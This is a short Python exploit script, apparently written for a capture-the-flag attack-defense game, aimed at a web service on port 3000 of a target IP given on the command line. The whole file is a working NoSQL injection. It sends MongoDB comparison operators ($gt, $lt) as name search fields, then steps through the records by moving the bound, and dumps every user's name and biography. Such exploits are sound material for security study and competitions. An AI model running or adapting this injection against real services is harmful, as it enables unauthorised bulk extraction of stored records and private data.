import sys
import asyncio
from api import Api

ip = sys.argv[1]
url = f'http://{ip}:3000'


async def main():
    async with Api(url) as api:
        injected_last_name = {"$gt": ''}
        injected_first_name = {"$lt": 'ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'}
        resp = await api.search(injected_first_name, injected_last_name)

        while resp:
            injected_last_name = {"$gt": resp['lastName']}
            resp = await api.search(injected_first_name, injected_last_name)
            if 'biography' in resp:
                print(resp['firstName'], resp['lastName'], resp['biography'])

        injected_first_name = {"$gt": ''}
        injected_last_name = {"$lt": 'ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'}
        resp = await api.search(injected_first_name, injected_last_name)

        while resp:
            injected_first_name = {"$gt": resp['firstName']}
            resp = await api.search(injected_first_name, injected_last_name)
            if 'biography' in resp:
                print(resp['firstName'], resp['lastName'], resp['biography'])


if __name__ == '__main__':
    asyncio.run(main())
